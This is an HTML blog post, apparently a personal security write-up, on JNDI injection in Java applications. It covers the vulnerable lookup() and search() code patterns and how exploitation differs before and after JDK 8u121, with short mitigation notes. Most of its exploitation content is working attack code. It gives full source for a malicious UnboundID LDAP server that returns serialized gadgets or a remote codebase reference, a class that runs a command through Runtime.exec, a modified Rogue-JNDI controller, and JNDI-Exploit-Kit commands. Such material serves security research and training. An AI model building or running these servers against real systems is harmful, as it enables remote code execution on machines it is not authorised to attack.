---
layout: default
---
<html>
    <body>
        <h2>JNDI Injection To Remote Code Execution.</h2>
        <p>
            <br />
        </p>
        <p>In this blog post we will talk about&nbsp;</p>
        <p></p>
        <ul style="text-align: left;">
            <li>What is JNDI Injection</li>
            <li>Vulnerable Code Signature</li>
            <li>Exploitation</li>
            <ul>
                <li>Before JAVA 8u121</li>
                <li>After Java 8u121</li>
            </ul>
            <li>Mitigation</li>
            <li>Root Cause Analysis</li>
            <li>Building your Own Malicious LDAP Server</li>
            <li>Modifying Existing Tools</li>
        </ul>
        <h3 style="text-align: left;">What is JNDI Injection:</h3>
        <div>JNDI stands for Java Naming Directory.</div>
        <div>This is used on Java apps for various purposes which most of time includes to either search for something on ldap or the Corporate Active Directory.</div>
        <div>
            <br />
        </div>
        <div>So lets say you have an application where you want the user to be able to login with the corporate AD Creds.</div>
        <div>
            <br />
        </div>
        <div>So to achieve this you have to integrate your enterprise JAVA application with your Corporate Active Directory or you can set it up with an LDAP server either used by the same Active direcotory or some other ldap server that you controll which have the
            user identity with it.</div>
        <div>
            <br />
        </div>
        <div>Now to achieve this you have to use the Java Naming Directory Libraries or the below list of packages</div>
        <div>
            <ul style="text-align: left;">
                <li>import javax.naming.InitialContext;</li>
                <li>import javax.naming.Context;</li>
                <li>import javax.naming.NamingEnumeration;</li>
                <li>import javax.naming.NamingException;</li>
                <li>import javax.naming.directory.*;</li>
            </ul>
            <h3 style="text-align: left;">Vulnerable Code Signature:</h3></div>
        <div>Before looking at the vulnerable code , lets look at how the actual use case code looks like.</div>
        <div>Now there 2 things primarily gets done by the JNDI.</div>
        <div>
            <ul style="text-align: left;">
                <li>Search for the entity</li>
                <li>Look Up&nbsp;</li>
            </ul>
            <div>So on the first instance where you want to check if the user exist on the Ldap server or not, you will perform a search operation.</div>
        </div>
        <div>
            <br />
        </div>
        <p><img src="images/jndiInjection/jndisearch.PNG"></p>
        <div>Similarly, lets say you have an application which takes and ldap server configuration , there the operation that primarily going to happen is a Ldap Look Up.</div>
        <div>
            <br />
        </div>
        <div>But why an application will take ldap server as input?</div>
        <div>
            <br />
        </div>
        <div>Well there are many reasons but lets take the below scenario into account .</div>
        <div>
            <br />
        </div>
        <div>Lets say you have an application which allows you to use your ldap server for authentication,</div>
        <div>Now in order to do that the application first needs to take the ldap servicer configuration and perform a look up and once the lookup is successful then the rest of the process continues.</div>
        <div>
            <br />
        </div>
        <div>Below is the sample code for the ldap lookup(or we can say a JNDI lookup)</div>
        <div>
            <p><img src="images/jndiInjection/jndilookup.PNG"></p>
        <div>Now both the above code is vulnerable to JNDI Injection.</div>
        <h3 style="text-align: left;">Exploitation:</h3>
        <div>The exploitation for both the sitatuion is same.</div>
        <div>
            <br />
        </div>
        <h4 style="text-align: left;">For lookup():</h4>
        <div>if we can control the input for the ctx.lookup() then we can acieve JNDI injection and eventually a Remote Code Execution/</div>
        <h4 style="text-align: left;">For Search():</h4>
        <div>For a successful exploitation of the search() we need to have the seach attribute in controll plus setReturningObjectFlag of the searchControl class needs to be true.</div>
        <div>if you see the above , you will notice that on the ctx.search() we are sending an object of the searchControll class.</div>
        <div>
            <br />
        </div>
        <div>This class has an attribute called setReturningObjectFlag().</div>
        <div>
            <br />
        </div>
        <div>The setReturningObjFlag method of the SearchControls class in Java's JNDI API controls whether or not the search results include the objects bound to the names found in the directory. When using the javax.naming.directory package to perform searches in
            a directory, you can configure SearchControls to dictate how the search should be conducted. This includes the scope of the search, which attributes to return, and whether the actual objects associated with the directory entries should be returned.</div>
        <div>
            <br />
        </div>
        <div>So if this flag's value is set to True and the LDAP server returns a serialized Object then the JNDI api is going to deserialize the object resulting in potential remote code execution</div>
        <div>
            <br />
        </div>
        <div>To exploit this vulnerability we have to host a ldap server which can return a malicious Object which upon deserlisation can get us a code exuection.</div>
        <div>
            <br />
        </div>
        <div>Now The exploitation differs slightly from JDK version to version:</div>
        <div>
            <br />
        </div>
        <h4 style="text-align: left;">On JDK &lt;=8u121:</h4>
        <div>On JDK &lt;=8u121 the we can send serialized data in such a way that the JNDI loads a class from a remote server and execute it.</div>
        <div>
            <br />
        </div>
        <div>This happens due to the fact that on JDK code before the specified version at</div>
        <div>
            <br />
        </div>
        <div>com/sun/jndi/ldap/VersionHelper.java#55 sets the value of the&nbsp;com.sun.jndi.ldap.object.trustURLCodebase property to True.</div>
            <div>In higher version of jdk this property's default value is set to false but if your application explicitly set it to true then on higher vesions of jdk you can load a remote class as well.</div>
        <div>
            <br />
        </div>
        <div>Hence on <b><i>JDK &lt;=8u121</i></b> you can directly load a remote class over LDAP or RMI</div>
        <div>
            <br />
        </div>
        <div>
            <br />
        </div>
        <div>
            <h4>On JDK &gt;=8u121:</h4></div>
        <div>
            <br />
        </div>
        <div>Since on these version the value of the com.sun.jndi.ldap.object.trustURLCodebase property is set to false you can not load a malicious class from a remote server and achieve RCE.</div>
        <div>
            <br />
        </div>
        <div>But to test if the vulnerability exist or not you can still get DNS pings backs.</div>
        <div>
            <br />
        </div>
        <div>In order to get a Full RCE on these version you have to use the gadgets present on the Class Path.</div>
        <div>
            <br />
        </div>
        <br />
        <br />
        <div>To Understand it better lets use a vulnerable application, set up our own malicious ldap server and try to exploit the vulnerability.</div>
        <div>
            <br />
        </div>
        </div>
        
        <div>You can get the VulnerableApplication from <a href="https://github.com/w3bspl01t3r/VulnerableApps">Here</a></div>
        <div>
            <br />
        </div>
        <div>We will use <a href="https://github.com/pimps/JNDI-Exploit-Kit/tree/master">JNDI-Exploit-Kit</a> as the malicious LDAP Server</div>
        <div>
        <P><h4><i><b>we will first exploit it on JDK 8u121</b></i></h4></P>
        <p>
            you can first compile the app with JDK 8u121 by downloading the jdk8u121 from Oracle site and putting it in the class path.
        </p>
        <p>
        
            Now lets download the JNDI-Exploit-Kit
        
        </p>
        <p>Lets Compile the JNDI Exploit Kit and start our malicious JNDI server</p>
        <p>mvn clean package</p>
        <p>java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar  -C "curl http://localhost:9001/ExploitWith8u121Success"</p>
        <p>The above will generate some ldap and rmi urls, pick the right url and feed it to the app.</p>
        <p>You will see that we got a http call back to our server as shown on the below image</p>
        <p><img src="images/jndiInjection/jndilookupExploit8u121.PNG"></p>
        </div>
        
        <div><p><h4><i><b>we will now exploit it on JDK version higher than 8u121</b></i></h4></p>
        
            <p>Key point here is that we need to have to have a gadget on the class path to Get Full fledge RCE on JDK version
                higher than 8u121+ and 8u191+
            </p>
            <p>
                So we will take 2 cases 
            </p>
            <p>
                <ul>
                    <li>With 1 of the gadget Such as commonsCollections present on the class Path</li>
                    <li>No gadget of ysoserial present but the app is deployed on tomcat</li>
                </ul>
            </p>
            <br />
            <br />
            <p>Lets change the Ldap URL as follows</p>
            <p><img src="images/jndiInjection/lookupExampleWIthCommonsCollections6.PNG"></p>
            <p>Lets try the same above methods but this time we will compile the code by passing CommonsCollection3.2.1 on the class path
         </p>
         <p>javac -cp commons-collections-3.2.1.jar:. jntest.java</p>
         <p>java -cp commons-collections-3.2.1.jar:. jntest</p>
        
         <p> you will see ,this time the operations on the ldap server is different.</p>
         <p>instead of pointing to the remote class the ldap server has returned a serialised data which is for CommonsCollections6 gadget</p>
         <P>and we have successfully exploited the vulnerablity</P>
         <p><img src="images/jndiInjection/SuccessFulexploitWithGadget.PNG"></p>
        </div>
        <h3>Using Tomcat WebServer</h3>
        <p> Now the way we exploit the vulnerablity in a tomcat server is by utilising a gadget present on the tomcat class Path</p>
        <p>The gadget is tomcat version specific.THe last version i check where it was working was tomcat 8.0.75<NEEDS TO BE VERIFIED></p>
        <div>
            <br />
        </div>
        <div>
            <br />
        </div>
        <h3 style="text-align: left;">Mitigation:</h3>
        <h4>For lookup():</h4>
        <div>The vulnerability here lies on the Custom App written by the developer which passes the user controlled data to the initialContext.Lookup().</div>
        <div>
            <br />
        </div>
        <div>The url passed to the initialContext.Lookup() should not be user controlled,</div>
        <div>
            <br />
        </div>
        <h4 style="text-align: left;">For search():</h4>
        <div>The default value of SearchControls.setReturningObjFlag () is set to False.</div>
        <div>So unless the flag is explicitly set to True , the search() is not vulnerable and can be used as it is.</div>
        <h3 style="text-align: left;">Root Cause Analysis:</h3>
        <h3 style="text-align: left;">Building your Own Malicious LDAP Server</h3>
        <i><b>Note:</b>In real life exploitation you may not find any of the ysoserial gadget working.
        <br>At that time you need a custom gadget and should be able to integrate that gadget with your own malicous server or available tools.
    <br>So learning how to build your own Malicious server can  help you with both the cases.</i>
        <div><p>The Ldap server can be built for 2 purpose</p>
        <ul><li>For remote class loading</li>
        <li>For sending Seriliased Data that uses Gadgets present in the class path to Acived RCE</li></ul></div>
        <div><h4>For sending Seriliased Data that uses Gadgets present in the class path to Acived RCE</h4></div>
        <p>So lets breka the malicious ldap server into below steps</p>
        <p>We will be using <a href="https://mvnrepository.com/artifact/com.unboundid/unboundid-ldapsdk/7.0.0"> UnboundID LDAP SDK</a></p>
        <p>
            <ol>
                <li>Configure the  in-memory LDAP Serverr</li>
                <code>
                    <pre>
                    public class ldaptest {

                        //Setting up the configuration for the malicious LDAP Server
                            InMemoryDirectoryServerConfig serverConfiguration() throws LDAPException
                            {
                                    InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("random=test");
                                    InMemoryListenerConfig listenerConfig = InMemoryListenerConfig.createLDAPConfig("default", 1389);
                                    config.setListenerConfigs(listenerConfig);
                                    return config;
                            }
                        </pre> 
                </code>
                <li>Add entries that returns Serialised data for a particular search</li>
                <code>
                    <pre>
                        //Creating Malicous Entries TO send Serilised Data
                        InMemoryDirectoryServerConfig malicousServerEntryAndResponse(byte[] decodedBytes) throws LDAPException
                        {
                            InMemoryDirectoryServerConfig config=serverConfiguration();
                    
                    
                    
                            //Itnercepting the Call and sending Malcious Response
                            config.addInMemoryOperationInterceptor(new InMemoryOperationInterceptor() {
                                @Override
                                public void processSearchResult(InMemoryInterceptedSearchResult result) {
                                    ReadOnlySearchRequest request = result.getRequest();
                                    if (request.getBaseDN().toString().equalsIgnoreCase("o=custom")) {
                                        System.out.println("Inside Malicious EntryFucntion() on custome thing");
                                        Entry entry = new Entry("o=custom");
                                        entry.addAttribute("javaClassName", "java.lang.String");
                                        entry.addAttribute("javaSerializedData", decodedBytes);
                                        System.out.println("service Response");
                                        try {
                                            result.sendSearchEntry(entry);
                                            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
                                        } catch (LDAPException e) {
                                            e.printStackTrace();
                                        }
                                    } else {
                                        result.setResult(new LDAPResult(0, ResultCode.NO_SUCH_OBJECT));
                                    }
                                }
                            });
                    
                    
                            return config;
                        }
                    </pre>
                </code>
                <li>Start the ldap server</li>
                <code><pre>
                    //Main Method
                    public static void main(String[] args) {
                        try {
                            //Ysoserial Payload
                            String ser_data="base64 encoded Serilised Gadget Data";
                            byte[] decodedBytes = Base64.getDecoder().decode(ser_data);
                
                
                            ldaptest obj=new ldaptest();
                            
                
                            //Starts the LDAP Server
                            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(obj.malicousServerEntryAndResponse(decodedBytes));
                            ds.startListening();
                            System.out.println("LDAP Server started on port 1389");
                
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }

                    
                </pre></code>
                <div><p>
                    <h3><i>Adding all up a sample malicious LDAP Server code Lokks like below</i></h3>
                </p>
                <p>
                    <code>
                        <pre>
import java.util.Base64;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.*;

public class ldaptest {

//Setting up the configuration for the malicious LDAP Server
    InMemoryDirectoryServerConfig serverConfiguration() throws LDAPException
    {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("random=test");
            InMemoryListenerConfig listenerConfig = InMemoryListenerConfig.createLDAPConfig("default", 1389);
            config.setListenerConfigs(listenerConfig);
            return config;
    }



    //Creating Malicous Entries TO send Serilised Data
    InMemoryDirectoryServerConfig malicousServerEntryAndResponse(byte[] decodedBytes) throws LDAPException
    {
        InMemoryDirectoryServerConfig config=serverConfiguration();



        //Itnercepting the Call and sending Malcious Response
        config.addInMemoryOperationInterceptor(new InMemoryOperationInterceptor() {
            @Override
            public void processSearchResult(InMemoryInterceptedSearchResult result) {
                ReadOnlySearchRequest request = result.getRequest();
                if (request.getBaseDN().toString().equalsIgnoreCase("o=custom")) {
                    System.out.println("Inside Malicious EntryFucntion() on custome thing");
                    Entry entry = new Entry("o=custom");
                    entry.addAttribute("javaClassName", "java.lang.String");
                    entry.addAttribute("javaSerializedData", decodedBytes);
                    System.out.println("service Response");
                    try {
                        result.sendSearchEntry(entry);
                        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
                    } catch (LDAPException e) {
                        e.printStackTrace();
                    }
                } else {
                    result.setResult(new LDAPResult(0, ResultCode.NO_SUCH_OBJECT));
                }
            }
        });


        return config;
    }

    //Main Method
    public static void main(String[] args) {
        try {
            //Ysoserial Payload
            String ser_data="base64 encoded Serilised Gadget Data";
           
            byte[] decodedBytes = Base64.getDecoder().decode(ser_data);


            ldaptest obj=new ldaptest();
            

            //Starts the LDAP Server
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(obj.malicousServerEntryAndResponse(decodedBytes));
            ds.startListening();
            System.out.println("LDAP Server started on port 1389");

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

                        </pre>
                    </code>
                </p>
                </div>
    </ol>
    
</p>

<div><h4>For Remote Class Loading:</h4></div>
<p>For remote class loading we have to change the malicousServerEntryAndResponse() as below.  </p>
<p>
    <code>
        <pre>
            InMemoryDirectoryServerConfig malicousServerEntryAndResponse(byte[] decodedBytes) throws LDAPException
                {
                InMemoryDirectoryServerConfig config=serverConfiguration();



                //Itnercepting the Call and sending Malcious Response
                config.addInMemoryOperationInterceptor(new InMemoryOperationInterceptor() {
                    @Override
                    public void processSearchResult(InMemoryInterceptedSearchResult result) {
                        ReadOnlySearchRequest request = result.getRequest();
                        if (request.getBaseDN().toString().equalsIgnoreCase("o=custom")) {
                            System.out.println("Inside Malicious EntryFucntion() on custome thing");
                            Entry entry = new Entry("o=custom");
                            entry.addAttribute("objectClass", "javaNamingReference");
                            entry.addAttribute("javaClassName", "java.lang.String"); //could be any unknown
                            entry.addAttribute("javaFactory", "testObject"); //could be any unknown
                            entry.addAttribute("javaCodebase", "http://localhost:9004/");
                            //entry.addAttribute("javaSerializedData", decodedBytes);
                            System.out.println("service Response");
                            try {
                                result.sendSearchEntry(entry);
                                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
                            } catch (LDAPException e) {
                                e.printStackTrace();
                            }
                        } else {
                            result.setResult(new LDAPResult(0, ResultCode.NO_SUCH_OBJECT));
                        }
                    }
                });


                return config;
    }
        </pre>
    </code>
</p>
<p>
    we have added 4 new entires and removed the javaSerializedData attribute.
    <ol>
        <li>objectClass=javaNamingReference</li>
        <li>javaClassName=java.lang.String //could be any unknown</li>
        <li>javaFactory",="testObject" //could be any unknown</li>
        <li>javaCodebase"= "http://localhost:9004/"</li>
                            
    </ol>
</p>
<p> Now the Vulnerable application is going to fetch the http://localhost:9004/testObject.class</p>
<p>So you need to have testObject.class ready On your server</p>
<p>The testObject class should implement  javax.naming.spi.ObjectFactory and should override the getObjectInstance()</p>
<p>The code you want to execute should be inside the default constructor.</p>

<p>inshort the testObject.class code should look like below</p>
<p>
    <code>
        <pre>
import java.lang.*;
import javax.naming.Context;
import javax.naming.Name;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.Hashtable;
public class testObject implements javax.naming.spi.ObjectFactory
{
    public testObject()
    {
        try{
        Runtime.getRuntime().exec("touch /tmp/pwnedViaRemoteReference");
    }catch(Exception e)
    {
        e.printStackTrace();
    }
}
@Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {
        return null;
    }
}
        </pre>
    </code>
</p>

<h3 style="text-align: left;">Modifying Existing Tools</h3>
<div>
    <p>Although it is not difficult to build own malicious server , it is often easier to modify the exsting to full fill your exploitation Requirements </p>
</div>
<div><p>So lets analyse how to modify some existing tools such as <a href="https://github.com/veracode-research/rogue-jndi">Rogue JNDI server From Veracode</a></p></div>
<p>Lets take WebSphere1.java to understand how to build our own Ldaper Mapper where we can add our gadget</p>
<div>
    If you see there few thing on the webSphere1.java
    <ol>
        <li>An Custom Annotation @LdapMapping</li>
        This attribute takes the url which is like the attribute the vulnrable application is either going to lookup() or search() for.
        <li>The Class implements LDAPCOntroller and the sendReuslt Function takes InMemoryInterceptedSearchResult as input</li>
        This result is then used to send the response back the user
        <li>In side the sendResult() we see 2 key things
            <ul>
                <li><code><pre>e.addAttribute("javaClassName", "java.lang.String");</pre></code></li>
                <li><code><pre>e.addAttribute("javaSerializedData", serialize(ref));</pre></code></li>
            </ul>
        </li>
        The rest are the gadget used(WebSphere1 gadget).
        javaSerializedData is being used to send the serialize ref which === Sending the serialized gadget data
    </ol>
</div>
<p>
    So assuming we do not have any well known gadget in the class path and we have to custom make our gadget and want to integrate it with the above ldap server , we can follow below steps.
</p>
<ul>
    <li>
        Create a file called custom.java under the controller directory.
    </li>
    <li>
        Copy paste the below code
        <code>
            <pre>
                package artsploit.controllers;
                import artsploit.annotations.LdapMapping;
                import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
                import com.unboundid.ldap.sdk.Entry;
                import com.unboundid.ldap.sdk.LDAPResult;
                import com.unboundid.ldap.sdk.ResultCode;
                import java.util.Base64;
                @LdapMapping(uri = { "/o=custom"})
                public class custom implements LdapController {
                
                    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
                        Entry e = new Entry(base);
                        System.out.println(base);
                        e.addAttribute("javaClassName", "java.lang.String"); //could be anything
                        String ser_data="base64 encoded serialized Gadget Data";
                        byte[] decodedBytes = Base64.getDecoder().decode(ser_data);
                        e.addAttribute("javaSerializedData",decodedBytes );
                        System.out.println("Data sent");
                    
                        result.sendSearchEntry(e);
                        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
                    }
                }

            </pre>
        </code>
    </li>
    <li>Recomplie the Application
        <code><pre>mvn clean package</pre></code>
    </li>
</ul>
<p>Now you can see that our custom mapper is ready to exploit.</p>
<p><img src="images/jndiInjection/CustomRogueJNDICode.PNG"></p>



<br>
<br>
<p><b>Thats it For Today.</b></p>
<p><b>Thanks For Reading.</b></p>
<p><b>Happy Hacking.</b></p>
<p><b>You can connect with me at:</b></p>
<p><a href="https://www.linkedin.com/in/swagatkumar/">Linkedin</a></p>
<p><a href="https://x.com/webspl01t3r">Twitter</a></p>
</body>
</html>